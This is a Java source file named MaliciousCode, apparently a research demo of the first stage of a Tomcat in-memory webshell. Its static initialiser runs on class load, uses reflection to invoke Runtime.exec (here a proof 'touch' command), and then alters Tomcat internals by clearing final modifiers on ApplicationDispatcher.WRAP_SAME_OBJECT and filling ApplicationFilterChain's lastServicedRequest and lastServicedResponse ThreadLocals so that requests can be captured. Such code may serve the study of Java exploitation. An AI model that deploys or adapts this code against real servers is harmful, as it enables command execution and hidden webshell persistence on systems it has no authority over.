package com.example.demo.Static;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;

/**
 * Step1: 设置静态变量，存储request对象
 */
public class MaliciousCode {
    // 静态代码块
    static {
        try {
            // 获取 Runtime 类
            Class<?> runtimeClass = Class.forName("java.lang.Runtime");

            // 获取 getRuntime 方法
            Method getRuntimeMethod = runtimeClass.getDeclaredMethod("getRuntime");

            // 调用 getRuntime 方法获取 Runtime 实例
            Object runtimeInstance = getRuntimeMethod.invoke(null);

            // 获取 exec 方法
            Method execMethod = runtimeClass.getDeclaredMethod("exec", String.class);

            // 调用 exec 方法执行命令
            execMethod.invoke(runtimeInstance, "touch /Users/admin/IdeaProjects/demo/success1.txt");
            // 打印执行成功信息
            System.out.println("Command executed successfully.");

            //修改 WRAP_SAME_OBJECT 值为 true
            Class c = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            java.lang.reflect.Field f = c.getDeclaredField("WRAP_SAME_OBJECT");
            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (!f.getBoolean(null)) {
                f.setBoolean(null, true);
            }

            //初始化 lastServicedRequest
            c = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            f = c.getDeclaredField("lastServicedRequest");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());
            }
            System.out.println(f);

            //初始化 lastServicedResponse
            f = c.getDeclaredField("lastServicedResponse");
            modifiersField = f.getClass().getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            f.setAccessible(true);
            if (f.get(null) == null) {
                f.set(null, new ThreadLocal());
            }

            Field lastServicedRequest2 = c.getDeclaredField("lastServicedRequest");
            lastServicedRequest2.setAccessible(true);
            ThreadLocal thredLocal = (ThreadLocal) lastServicedRequest2.get(null);

            System.out.println(thredLocal);
            System.out.println(thredLocal.get());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 可以选择添加额外的代码，但静态代码块已经在类加载时执行
}
